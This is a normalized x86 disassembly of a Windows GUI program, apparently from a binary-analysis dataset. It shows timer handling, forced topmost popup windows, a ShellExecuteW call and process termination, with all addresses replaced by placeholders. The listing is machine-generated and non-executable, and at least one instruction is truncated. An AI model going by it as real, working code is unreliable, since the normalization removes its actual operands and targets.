call sub_42e1f0
mov edi 0x8
xor edx edx
mov [ esi + 0xe98 ] 0x1
mov [ esp + 0x104 ] 0x7
mov [ esp + 0x100 ] ebx
mov [ esp + 0xf0 ] dx
push r--data
lea edi [ esp + 0xf0 ]
mov [ esp + 0x134 ] 0x8
call sub_421d30
mov eax [ esp + 0xf4 ]
mov edi 0x8
add esp 0x4
cmp [ esp + 0x104 ] edi
jae r-xdata
xor ecx ecx
mov esi 0x7
mov [ esp + 0x5c ] esi
mov [ esp + 0x58 ] ebx
mov [ esp + 0x48 ] cx
cmp [ esp + 0x40 ] edi
jb r-xdata
mov eax [ esp + 0x48 ]
push eax
call sub_43f960
add esp 0x4
push eax
call sub_441113
add esp 0x4
cmp eax 0x17
mov [ esi + 0xe94 ] eax
jle r-xdata
lea eax [ esp + 0xf0 ]
xor eax eax
mov [ esp + 0x40 ] esi
mov [ esp + 0x3c ] ebx
mov [ esp + 0x2c ] ax
cmp [ esp + 0xe8 ] edi
jb r-xdata
mov edx [ esp + 0x2c ]
push edx
call sub_43f960
add esp 0x4
cmp eax ebx
jge r-xdata
mov [ esi + 0xe94 ] 0x17
jmp r-xdata
xor edx edx
mov [ esp + 0xe8 ] esi
mov [ esp + 0xe4 ] ebx
mov [ esp + 0xd4 ] dx
cmp [ esp + 0x78 ] edi
jb r-xdata
mov ecx [ esp + 0xd4 ]
push ecx
call sub_43f960
add esp 0x4
lea eax [ esp + 0x18 ]
push eax
call [ GetLocalTime@IAT ]
movzx ecx [ esp + 0x20 ]
cmp [ esi + 0xe94 ] ecx
jne r-xdata
mov [ esi + 0xe94 ] ebx
xor ecx ecx
mov [ esp + 0x78 ] esi
mov [ esp + 0x74 ] ebx
mov [ esp + 0x64 ] cx
cmp [ esp + 0xcc ] edi
jb r-xdata
mov eax [ esp + 0x64 ]
push eax
call sub_43f960
add esp 0x4
mov edx [ ebp ]
push ebx
push ebx
push 0x10
push edx
call [ PostMessageW@IAT ]
cmp [ esp + 0x22 ] 0x5
ja r-xdata
xor eax eax
mov [ esp + 0xcc ] esi
mov [ esp + 0xc8 ] ebx
mov [ esp + 0xb8 ] ax
cmp [ esp + 0x94 ] edi
jb r-xdata
mov edx [ esp + 0xb8 ]
push edx
call sub_43f960
add esp 0x4
mov edx [ ebp ]
push ebx
push 0xef
push 0x1c3
push ebx
push ebx
push edx
call [ MoveWindow@IAT ]
push ebp
call sub_4218f0
push 0x8001
call [ SetErrorMode@IAT ]
cmp [ esp + 0x5c ] edi
jb r-xdata
mov eax [ esp + 0xf0 ]
push eax
call sub_43f960
add esp 0x4
jmp r-xdata
mov ecx esi
call sub_4078a0
jmp r-xdata
xor edx edx
mov [ esp + 0x94 ] esi
mov [ esp + 0x90 ] ebx
mov [ esp + 0x80 ] dx
cmp [ esp + 0xb0 ] edi
jb r-xdata
mov ecx [ esp + 0x80 ]
push ecx
call sub_43f960
add esp 0x4
cmp [ esp + 0x104 ] edi
jb r-xdata
xor ecx ecx
mov [ esp + 0xb0 ] esi
mov [ esp + 0xac ] ebx
mov [ esp + 0x9c ] cx
cmp [ esp + 0x120 ] edi
jb r-xdata
mov eax [ esp + 0x9c ]
push eax
call sub_43f960
add esp 0x4
mov eax 0x1
mov ecx [ esp + 0x128 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x110 ]
xor ecx esp
call sub_43f96b
add esp 0x120
retn
mov edx [ esp + 0x10c ]
push edx
call sub_43f960
add esp 0x4
sub_407580
push 0xffffffff
push sub_45a7e8
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x14 ]
mov [ fs : 0x0 ] eax
mov eax [ esp + 0x24 ]
mov esi ecx
cmp eax 0x38b
jne r-xdata
cmp eax 0x384
jne r-xdata
push eax
mov eax [ esi + 0x4 ]
push eax
call [ KillTimer@IAT ]
mov ecx [ esi + 0x4 ]
push 0x43
push 0x0
push 0x0
push 0x0
push 0x0
push 0x1
push ecx
call [ SetWindowPos@IAT ]
push 0x0
call [ GetTopWindow@IAT ]
mov esi eax
test esi esi
je r-xdata
cmp eax 0x385
jne r-xdata
cmp [ esi + 0xe30 ] 0x0
jne r-xdata
mov ecx [ esp + 0x14 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
add esp 0x10
retn 0x4
push esi
call [ SetActiveWindow@IAT ]
push esi
call [ BringWindowToTop@IAT ]
push esi
call [ SetForegroundWindow@IAT ]
mov ecx [ esp + 0x14 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
add esp 0x10
retn 0x4
cmp eax 0x386
jne r-xdata
cmp [ rw-data ] 0x63
jl r-xdata
mov ecx [ rw-data ]
lea ebx [ esi + 0x234 ]
mov edi ebx
mov [ ebx + 0x38 ] ecx
call sub_422a00
mov edx [ rw-data ]
mov eax [ edx + 0xc ]
mov ecx rw-data
call eax
add eax 0x10
mov [ esp + 0x24 ] eax
mov [ esp + 0x1c ] 0x0
mov ecx [ esi + 0xe30 ]
push ecx
push r--data
lea edi [ esp + 0x2c ]
call sub_412480
mov edi [ esp + 0x2c ]
add esp 0x8
push edi
push ebx
call sub_41ff60
mov edx [ esi + 0x4 ]
push 0x1
push 0x0
or ebx 0xffffffff
add [ esi + 0xe30 ] ebx
push edx
call [ InvalidateRect@IAT ]
lea eax [ edi - 0x10 ]
mov [ esp + 0x1c ] ebx
lea ecx [ eax + 0xc ]
[ ecx ] ebx
dec ebx
test ebx ebx
jg r-xdata
mov edx [ esi + 0x4 ]
push 0x0
push 0x3ed
push 0x111
push edx
call [ PostMessageW@IAT ]
mov eax [ esi + 0x4 ]
push 0x384
push eax
call [ KillTimer@IAT ]
cmp eax 0x387
jne r-xdata
call [ GetTickCount@IAT ]
sub eax [ esi + 0xe44 ]
cmp eax 0x1388
jb r-xdata
mov ecx [ rw-data ]
inc ecx
lea eax [ esi + 0x5b4 ]
mov [ rw-data ] ecx
mov [ eax + 0x28 ] ecx
mov ecx [ eax + 0x1c ]
test ecx ecx
je r-xdata
mov ecx [ esi + 0x4 ]
push eax
push ecx
call [ KillTimer@IAT ]
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov ecx [ esp + 0x14 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
add esp 0x10
retn 0x4
cmp eax 0x388
jne r-xdata
mov edx [ esi + 0x4 ]
push eax
push edx
call [ KillTimer@IAT ]
mov eax [ esi + 0x110 ]
push eax
call [ SetEvent@IAT ]
mov ecx [ esp + 0x14 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
add esp 0x10
retn 0x4
cmp [ esi + 0xe40 ] 0x0
jg r-xdata
mov edx [ ecx ]
push 0x0
push 0x0
push 0x0
push eax
mov eax [ edx + 0x28 ]
call eax
mov ecx [ esp + 0x14 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
add esp 0x10
retn 0x4
cmp eax 0x389
jne r-xdata
mov ecx [ esi + 0xe80 ]
sub ecx [ esi + 0xe7c ]
sar ecx 0x2
cmp [ esi + 0xe6c ] ecx
jb r-xdata
add [ esi + 0xe40 ] 0xfffffff6
jns r-xdata
mov ecx [ esi + 0x4 ]
push 0x386
push ecx
call [ KillTimer@IAT ]
push 0x0
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
cmp eax 0x38a
jne r-xdata
push 0x0
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
mov ecx [ esp + 0x14 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
add esp 0x10
retn 0x4
mov [ esi + 0xe6c ] 0x0
mov ecx [ esp + 0x14 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
add esp 0x10
retn 0x4
mov al [ esi + 0xe40 ]
push esi
call sub_406e50
mov ecx [ esp + 0x14 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
add esp 0x10
retn 0x4
mov [ esi + 0xe40 ] 0x0
mov edx [ esi + 0x4 ]
push eax
push edx
call [ KillTimer@IAT ]
mov eax [ esi + 0x4 ]
push 0x0
push 0xf020
push 0x112
push eax
call [ SendMessageW@IAT ]
sub_4078a0
push 0xffffffff
push sub_45afc8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x5c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x58 ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x70 ]
mov [ fs : 0x0 ] eax
mov ebx ecx
xor ebp ebp
push ebp
mov [ esp + 0x18 ] ebx
call sub_440ccf
xor ecx ecx
add esp 0x4
mov [ esp + 0x68 ] 0x7
mov [ esp + 0x64 ] ebp
mov [ esp + 0x54 ] cx
push edx
push eax
push r--data
lea ecx [ esp + 0x5c ]
mov [ esp + 0x84 ] ebp
call sub_41f480
lea edx [ esp + 0x5c ]
add esp 0xc
push edx
mov edi r--data
call sub_41f340
add esp 0x4
push ebp
push r--data
call [ FindWindowW@IAT ]
cmp eax 0xffffffff
je r-xdata
cmp ebx ebp
je r-xdata
push ebp
push 0x1
push 0x2797
push eax
call [ PostMessageW@IAT ]
xor ecx ecx
lea ecx [ ebx + 0x24 ]
jmp r-xdata
xor ecx ecx
lea ecx [ ebx + 0x24 ]
jmp r-xdata
lea esi [ ebx + 0xcfc ]
mov [ esi + 0x1c ] ecx
mov [ esi + 0x20 ] ebp
mov [ esi + 0x24 ] ebp
mov [ esi + 0x4 ] 0x3
mov [ esi + 0x8 ] ebp
mov [ esi + 0xc ] ebp
mov [ esi + 0x10 ] ebp
mov [ esi + 0x14 ] ebp
mov [ esi + 0x18 ] ebp
mov eax [ ecx ]
mov edx [ eax ]
push esi
call edx
mov eax [ esi ]
mov edx [ eax + 0x8 ]
mov ecx esi
call edx
mov eax [ esi ]
mov edx [ eax + 0x14 ]
push ebp
push ebp
mov ecx esi
call edx
mov eax [ esi ]
mov edx [ eax + 0x18 ]
push ebp
push ebp
mov ecx esi
call edx
cmp ebx ebp
je r-xdata
xor ecx ecx
lea ecx [ ebx + 0x24 ]
jmp r-xdata
lea edi [ ebx + 0xd2c ]
mov [ edi + 0x1c ] ecx
mov [ edi + 0x20 ] ebp
mov [ edi + 0x24 ] ebp
mov [ edi + 0x4 ] 0x3
mov [ edi + 0x8 ] ebp
mov [ edi + 0xc ] ebp
mov [ edi + 0x10 ] ebp
mov [ edi + 0x14 ] ebp
mov [ edi + 0x18 ] ebp
mov eax [ ecx ]
mov edx [ eax ]
push edi
call edx
mov eax [ edi ]
mov edx [ eax + 0x8 ]
mov ecx edi
call edx
mov eax [ edi ]
mov edx [ eax + 0x14 ]
push ebp
push ebp
mov ecx edi
call edx
mov eax [ edi ]
mov edx [ eax + 0x18 ]
push ebp
push ebp
mov ecx edi
call edx
cmp ebx ebp
je r-xdata
xor ecx ecx
lea ecx [ eax + 0x24 ]
jmp r-xdata
add ebx 0xd80
mov [ ebx + 0x1c ] ecx
mov [ ebx + 0x20 ] ebp
mov [ ebx + 0x24 ] ebp
mov [ ebx + 0x4 ] 0x3
mov [ ebx + 0x8 ] 0x3f2
mov [ ebx + 0xc ] ebp
mov [ ebx + 0x10 ] ebp
mov [ ebx + 0x14 ] ebp
mov [ ebx + 0x18 ] ebp
mov eax [ ecx ]
mov edx [ eax ]
push ebx
call edx
mov eax [ ebx ]
mov edx [ eax + 0x8 ]
mov ecx ebx
call edx
mov eax [ ebx ]
mov edx [ eax + 0x14 ]
push ebp
push ebp
mov ecx ebx
call edx
mov eax [ ebx ]
mov edx [ eax + 0x18 ]
push ebp
push ebp
mov ecx ebx
call edx
mov eax [ esp + 0x14 ]
cmp eax ebp
je r-xdata
xor ecx ecx
lea ecx [ ebp + 0x24 ]
jmp r-xdata
lea ebp [ eax + 0xdb8 ]
xor eax eax
mov [ ebp + 0x1c ] ecx
mov [ ebp + 0x20 ] eax
mov [ ebp + 0x24 ] eax
mov [ ebp + 0x4 ] 0x3
mov [ ebp + 0x8 ] 0x3f3
mov [ ebp + 0xc ] eax
mov [ ebp + 0x10 ] eax
mov [ ebp + 0x14 ] eax
mov [ ebp + 0x18 ] eax
mov eax [ ecx ]
mov edx [ eax ]
push ebp
call edx
mov eax [ ebp ]
mov edx [ eax + 0x8 ]
mov ecx ebp
call edx
mov eax [ ebp ]
mov edx [ eax + 0x14 ]
push 0x0
push 0x0
mov ecx ebp
call edx
mov eax [ ebp ]
mov edx [ eax + 0x18 ]
push 0x0
push 0x0
mov ecx ebp
call edx
mov ebp [ esp + 0x14 ]
test ebp ebp
je r-xdata
mov ecx [ ebx + 0x1c ]
test ecx ecx
je r-xdata
call sub_4230c0
mov edi [ ebx + 0x34 ]
mov esi [ rw-data ]
call sub_4230c0
mov edi [ edi + 0xc ]
mov ecx [ ebx + 0x1c ]
mov eax [ ecx ]
mov edx [ eax + 0x20 ]
push esi
push edi
push ebx
call edx
add ebp 0xdf0
xor eax eax
mov [ ebp + 0x1c ] ecx
mov [ ebp + 0x20 ] eax
mov [ ebp + 0x24 ] eax
mov [ ebp + 0x4 ] 0x3
mov [ ebp + 0x8 ] 0x3ec
mov [ ebp + 0xc ] eax
mov [ ebp + 0x10 ] eax
mov [ ebp + 0x14 ] eax
mov [ ebp + 0x18 ] eax
mov eax [ ecx ]
mov edx [ eax ]
push ebp
call edx
mov eax [ ebp ]
mov edx [ eax + 0x8 ]
mov ecx ebp
call edx
mov eax [ ebp ]
mov edx [ eax + 0x14 ]
push 0x0
push 0x0
mov ecx ebp
call edx
mov eax [ ebp ]
mov edx [ eax + 0x18 ]
push 0x0
push 0x0
mov ecx ebp
call edx
mov ecx [ esi + 0x1c ]
mov eax [ ecx ]
mov edx [ eax + 0x24 ]
push 0x9
push 0xa
push esi
call edx
mov ecx [ edi + 0x1c ]
mov eax [ ecx ]
mov edx [ eax + 0x24 ]
push 0xa
push 0x20
push edi
call edx
mov ecx [ ebx + 0x1c ]
mov eax [ ecx ]
mov edx [ eax + 0x24 ]
push 0x2
push 0x178
push ebx
call edx
mov edi rw-data
call sub_4230c0
mov eax [ esp + 0x14 ]
mov edi [ rw-data ]
mov ecx [ eax + 0xdd4 ]
mov edx [ ecx ]
add eax 0xdb8
push 0x2
add edi 0x178
push edi
push eax
mov eax [ edx + 0x24 ]
call eax
mov edi rw-data
call sub_4230c0
mov ecx [ ebp + 0x1c ]
mov edx [ ecx ]
mov edx [ edx + 0x24 ]
mov eax 0x178
sub eax [ rw-data ]
push 0x2
push eax
push ebp
call edx
mov eax [ rw-data ]
call sub_41f2d0
mov eax [ esp + 0x14 ]
push r--data
add eax 0xd2c
push eax
call sub_41ff60
test [ ebx + 0x4 ] 0x2
mov edi rw-data
mov [ ebx + 0x34 ] edi
je r-xdata
mov ebx [ esp + 0x14 ]
add ebx 0xdb8
test [ ebx + 0x4 ] 0x2
mov edi rw-data
mov [ ebx + 0x34 ] edi
je r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x28 ]
push 0x0
push 0x0
push 0x0
push ebx
call edx
mov ecx [ ebx + 0x1c ]
xor esi esi
cmp ecx esi
je r-xdata
call sub_4230c0
mov edi [ ebx + 0x34 ]
mov esi [ rw-data ]
call sub_4230c0
mov edi [ edi + 0xc ]
mov ecx [ ebx + 0x1c ]
mov eax [ ecx ]
mov edx [ eax + 0x20 ]
push esi
push edi
push ebx
call edx
test [ ebp + 0x4 ] 0x2
mov edi rw-data
mov [ ebp + 0x34 ] edi
je r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x28 ]
push esi
push esi
push esi
push ebx
call edx
mov ecx [ ebp + 0x1c ]
cmp ecx esi
je r-xdata
call sub_4230c0
mov edi [ ebp + 0x34 ]
mov ebx [ rw-data ]
call sub_4230c0
mov edi [ edi + 0xc ]
mov ecx [ ebp + 0x1c ]
mov eax [ ecx ]
mov edx [ eax + 0x20 ]
push ebx
push edi
push ebp
call edx
mov ebx [ esp + 0x14 ]
mov eax ebx
call sub_409cf0
push ebx
mov [ ebx + 0x188 ] esi
call sub_40b260
mov eax [ ebx + 0x4 ]
push 0x3
push 0xcc
push esi
push eax
call [ SetLayeredWindowAttributes@IAT ]
cmp [ ebx + 0xe98 ] esi
jne r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x28 ]
push esi
push esi
push esi
push ebp
call edx
mov eax [ ebx + 0x4 ]
push 0x5
push eax
call [ ShowWindow@IAT ]
mov ecx [ ebx + 0x4 ]
push ecx
call [ BringWindowToTop@IAT ]
mov edx [ ebx + 0x4 ]
push edx
call [ SetActiveWindow@IAT ]
mov eax [ ebx + 0x4 ]
push eax
call [ SetForegroundWindow@IAT ]
mov ecx [ ebx + 0x4 ]
push 0x53
push esi
push esi
push esi
push esi
push 0x1
push ecx
call [ SetWindowPos@IAT ]
mov edx [ ebx + 0x4 ]
push 0x1
push edx
call [ FlashWindow@IAT ]
jmp r-xdata
mov eax [ ebx + 0xe88 ]
xor ebp ebp
cmp eax ebp
je r-xdata
lea ecx [ esp + 0x1c ]
mov ecx [ ebx + 0x4 ]
push esi
push 0x3e8
push 0x384
push ecx
call [ SetTimer@IAT ]
mov ecx ebx
call sub_409c20
mov edx [ ebx + 0x78 ]
push edx
lea edx [ ebx + 0x90 ]
xor ecx ecx
call sub_402f50
xor eax eax
mov [ esp + 0x2c ] esi
mov [ esp + 0x1c ] ax
push 0x32
mov eax r--data
lea esi [ esp + 0x1c ]
mov [ esp + 0x34 ] 0x7
call sub_429cc0
push 0x3
mov eax r--data
mov ecx esi
mov [ esp + 0x7c ] 0x1
call sub_429170
mov edi esi
call sub_41f1a0
cmp [ esp + 0x30 ] 0x8
mov ecx [ esp + 0x1c ]
jae r-xdata
push 0x32
mov eax r--data
lea esi [ esp + 0x1c ]
call sub_429cc0
mov al [ ebx + 0xe28 ]
test al al
je r-xdata
push ecx
call eax
push 0x6
mov eax r--data
cmp [ ebx + 0xe29 ] 0x0
je r-xdata
mov eax [ ebx + 0xe88 ]
cmp eax ebp
je r-xdata
lea ecx [ esp + 0x1c ]
test al al
je r-xdata
cmp [ ebx + 0xe2a ] 0x0
jne r-xdata
xor ecx ecx
mov [ esp + 0x4c ] 0x7
mov [ esp + 0x48 ] ebp
mov [ esp + 0x38 ] cx
push r--data
lea edi [ esp + 0x38 ]
mov [ esp + 0x7c ] 0x2
call sub_421d30
add esp 0x4
cmp [ esp + 0x48 ] ebp
je r-xdata
push ecx
call eax
cmp [ ebx + 0xe29 ] 0x0
je r-xdata
push 0x7
mov eax r--data
jmp r-xdata
cmp [ esp + 0x4c ] esi
jb r-xdata
push 0x32
mov eax r--data
lea esi [ esp + 0x1c ]
call sub_429cc0
mov eax [ esp + 0x48 ]
push r--data
mov edi 0x1
lea ecx [ esp + 0x38 ]
call sub_4298e0
test eax eax
jne r-xdata
cmp [ ebx + 0xe2a ] 0x0
je r-xdata
lea ecx [ esp + 0x1c ]
call sub_429170
lea edi [ esp + 0x18 ]
call sub_41f1a0
mov ecx [ esp + 0x1c ]
mov esi 0x8
cmp [ esp + 0x30 ] esi
jae r-xdata
xor eax eax
mov edi 0x7
mov [ esp + 0x4c ] edi
mov [ esp + 0x48 ] ebp
mov [ esp + 0x38 ] ax
cmp [ esp + 0x30 ] esi
jb r-xdata
mov edx [ esp + 0x38 ]
push edx
call sub_43f960
add esp 0x4
mov eax [ esp + 0x48 ]
push r--data
lea ecx [ esp + 0x38 ]
call sub_4298e0
test eax eax
jne r-xdata
push 0x5
mov eax r--data
jmp r-xdata
push 0x3
mov eax r--data
jmp r-xdata
xor edx edx
mov [ esp + 0x30 ] edi
mov [ esp + 0x2c ] ebp
mov [ esp + 0x1c ] dx
cmp [ esp + 0x68 ] esi
jb r-xdata
mov ecx [ esp + 0x1c ]
push ecx
call sub_43f960
add esp 0x4
push 0x6
mov eax r--data
push 0x5
mov eax r--data
jmp r-xdata
lea ecx [ esp + 0x1c ]
call sub_429170
lea edi [ esp + 0x18 ]
call sub_41f1a0
cmp [ esp + 0x30 ] 0x8
mov eax [ esp + 0x1c ]
jae r-xdata
mov eax 0x1
mov ecx [ esp + 0x70 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x58 ]
xor ecx esp
call sub_43f96b
add esp 0x68
retn
mov eax [ esp + 0x54 ]
push eax
call sub_43f960
add esp 0x4
mov ebx [ ebx + 0xe88 ]
cmp ebx ebp
je r-xdata
lea eax [ esp + 0x1c ]
mov esi 0x8
push eax
call ebx
sub_407f60
push 0xffffffff
push sub_45a7b8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x20 ] eax
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x28 ]
mov [ fs : 0x0 ] eax
xor eax eax
mov [ esp + 0x20 ] 0x7
mov [ esp + 0x1c ] 0x0
mov [ esp + 0xc ] ax
lea ecx [ esp + 0x8 ]
mov [ esp + 0x30 ] eax
call sub_429250
push 0xb
mov eax r--data
lea ecx [ esp + 0xc ]
call sub_429170
cmp [ esp + 0x20 ] 0x8
mov eax [ esp + 0xc ]
jae r-xdata
push eax
call sub_42ed00
add esp 0x4
test eax eax
je r-xdata
lea eax [ esp + 0xc ]
cmp [ esp + 0x20 ] 0x8
jb r-xdata
cmp [ esp + 0x20 ] 0x8
mov eax [ esp + 0xc ]
jae r-xdata
mov eax 0x1
mov ecx [ esp + 0x28 ]
mov [ fs : 0x0 ] ecx
pop ecx
mov ecx [ esp + 0x20 ]
xor ecx esp
call sub_43f96b
add esp 0x30
retn
mov ecx [ esp + 0xc ]
push ecx
call sub_43f960
add esp 0x4
push 0x1
push 0x0
push r--data
push eax
push r--data
push 0x0
call [ ShellExecuteW@IAT ]
lea eax [ esp + 0xc ]
sub_408040
sub esp 0x38
mov eax [ esi + 0x4 ]
push ebx
push ebp
push edi
push 0x384
push eax
call [ KillTimer@IAT ]
mov ecx [ esi + 0x180 ]
sub ecx [ esi + 0x17c ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov ecx edx
xor ebx ebx
shr ecx 0x1f
add ecx edx
mov [ esp + 0x10 ] ebx
je r-xdata
push esi
mov [ esi + 0x188 ] 0x1
call sub_40b260
lea eax [ esi + 0x5b4 ]
mov [ eax + 0x38 ] 0xffff
mov [ eax + 0x2c ] 0x64
mov ecx [ eax + 0x1c ]
mov [ eax + 0x28 ] 0x0
test ecx ecx
je r-xdata
xor ebp ebp
lea edi [ esi + 0x90 ]
mov [ edi + 0x7c ] 0x0
mov [ edi + 0x7d ] 0x0
mov ecx [ edi + 0x80 ]
push ecx
call [ ResetEvent@IAT ]
push edi
call sub_405780
mov edx [ edi + 0x4 ]
test edx edx
jne r-xdata
mov edx [ ecx ]
push 0x0
push 0x0
push 0x0
push eax
mov eax [ edx + 0x28 ]
call eax
mov eax [ esi + 0x17c ]
add eax ebp
lea ecx [ eax + 0x74 ]
mov eax [ ecx + 0x14 ]
push r--data
mov edi 0x8
call sub_4298e0
mov ecx [ esi + 0x180 ]
sub ecx [ esi + 0x17c ]
test eax eax
mov eax 0x4bda12f7
jne r-xdata
call sub_4407b7
mov edx [ esi + 0x4 ]
xor eax eax
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] eax
mov [ esp + 0x2c ] eax
lea eax [ esp + 0x20 ]
push eax
mov [ esi + 0xe3c ] 0x0
mov [ esp + 0x24 ] 0x10
mov [ esp + 0x28 ] 0x2
mov [ esp + 0x2c ] edx
call [ TrackMouseEvent@IAT ]
lea ecx [ esp + 0x18 ]
push ecx
call [ GetCursorPos@IAT ]
mov eax [ esi + 0x4 ]
lea edx [ esp + 0x30 ]
push edx
push eax
call [ GetWindowRect@IAT ]
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x18 ]
push ecx
push edx
lea eax [ esp + 0x38 ]
push eax
call [ PtInRect@IAT ]
mov ecx [ esi + 0x4 ]
mov edi [ SetTimer@IAT ]
push 0x0
push 0x64
push 0x388
push ecx
call edi
mov edx [ esi + 0x4 ]
push 0x0
push 0x1e
push 0x3039
push edx
mov [ esi + 0xe48 ] 0x0
mov [ esi + 0xe49 ] 0x0
call edi
mov eax [ esi + 0x4 ]
push 0x0
push 0x2bc
push 0x303a
push eax
call edi
pop edi
pop ebp
mov eax 0x1
pop ebx
add esp 0x38
retn
lea eax [ edi + 0x8 ]
push eax
push edx
push edi
push sub_402a60
push edx
push edx
call sub_44058c
mov [ edi + 0x4 ] eax
mov ecx [ edi + 0x4 ]
add esp 0x18
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp ebx eax
jb r-xdata
imul ecx
sar edx 0x6
cmp [ esi + 0xe28 ] 0x0
je r-xdata
mov eax [ esi + 0x17c ]
add eax ebp
lea ecx [ eax + 0x74 ]
mov eax [ ecx + 0x14 ]
push r--data
mov edi 0xa
call sub_4298e0
mov ecx [ esi + 0x180 ]
sub ecx [ esi + 0x17c ]
test eax eax
mov eax 0x4bda12f7
jne r-xdata
call sub_4407b7
mov eax edx
shr eax 0x1f
add eax edx
cmp ebx eax
jb r-xdata
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ebx ecx
jb r-xdata
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp ebx eax
jb r-xdata
imul ecx
sar edx 0x6
cmp [ esi + 0xe29 ] 0x0
je r-xdata
mov ecx [ esi + 0x17c ]
xor eax eax
mov [ ecx + ebp + 0x70 ] 0x0
mov [ esp + 0xc ] eax
call sub_4407b7
mov edx [ esi + 0x17c ]
xor eax eax
mov [ edx + ebp + 0x70 ] 0x1
mov [ esp + 0xc ] eax
mov [ esp + 0x14 ] eax
call sub_4407b7
mov eax [ esi + 0x17c ]
add eax ebp
lea ecx [ eax + 0x74 ]
mov eax [ ecx + 0x14 ]
push r--data
mov edi 0x8
call sub_4298e0
mov ecx [ esi + 0x180 ]
sub ecx [ esi + 0x17c ]
test eax eax
mov eax 0x4bda12f7
jne r-xdata
call sub_4407b7
mov eax edx
shr eax 0x1f
add eax edx
cmp ebx eax
jb r-xdata
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ebx ecx
jb r-xdata
mov ecx [ esi + 0x17c ]
lea eax [ ecx + ebp + 0xc0 ]
mov ecx [ eax + 0x10 ]
sub ecx [ eax + 0xc ]
mov eax 0x2aaaaaab
imul ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add eax edx
cmp [ esp + 0xc ] eax
jae r-xdata
call sub_4407b7
mov ecx [ esi + 0x17c ]
lea eax [ ecx + ebp + 0xc0 ]
mov ecx [ eax + 0x10 ]
sub ecx [ eax + 0xc ]
mov eax 0x2aaaaaab
imul ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add eax edx
cmp [ esp + 0xc ] eax
jae r-xdata
call sub_4407b7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp ebx eax
jb r-xdata
imul ecx
sar edx 0x6
cmp [ esi + 0xe2a ] 0x0
je r-xdata
mov ecx [ esi + 0x17c ]
xor eax eax
mov [ ecx + ebp + 0x70 ] 0x0
mov [ esp + 0xc ] eax
call sub_4407b7
mov edx [ esi + 0x17c ]
xor eax eax
mov [ edx + ebp + 0x70 ] 0x1
mov [ esp + 0xc ] eax
call sub_4407b7
mov ecx [ esi + 0x180 ]
sub ecx [ esi + 0x17c ]
mov ebx [ esp + 0x10 ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
inc ebx
add eax edx
add ebp 0xd8
mov [ esp + 0x10 ] ebx
cmp ebx eax
jb r-xdata
mov ecx [ esi + 0x180 ]
sub ecx [ esi + 0x17c ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ebx ecx
jb r-xdata
mov ecx [ esi + 0x180 ]
sub ecx [ esi + 0x17c ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ebx ecx
jb r-xdata
mov ecx [ esi + 0x17c ]
mov [ ecx + ebp + 0x70 ] 0x0
call sub_4407b7
mov eax edx
shr eax 0x1f
add eax edx
cmp ebx eax
jb r-xdata
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ebx ecx
jb r-xdata
mov ecx [ esi + 0x17c ]
lea eax [ ecx + ebp + 0xc0 ]
mov ecx [ eax + 0x10 ]
sub ecx [ eax + 0xc ]
mov eax 0x2aaaaaab
imul ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add eax edx
cmp [ esp + 0xc ] eax
jae r-xdata
call sub_4407b7
mov ecx [ esi + 0x17c ]
lea eax [ ecx + ebp + 0xc0 ]
mov ecx [ eax + 0x10 ]
sub ecx [ eax + 0xc ]
mov eax 0x2aaaaaab
imul ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add eax edx
cmp [ esp + 0xc ] eax
jae r-xdata
call sub_4407b7
mov ecx [ esi + 0x180 ]
sub ecx [ esi + 0x17c ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add eax edx
cmp ebx eax
jb r-xdata
mov edx [ esi + 0x17c ]
mov ecx [ edx + ebp + 0xd0 ]
sub ecx [ edx + ebp + 0xcc ]
lea edi [ edx + ebp + 0xc0 ]
mov eax 0x2aaaaaab
imul ecx
sar edx 0x5
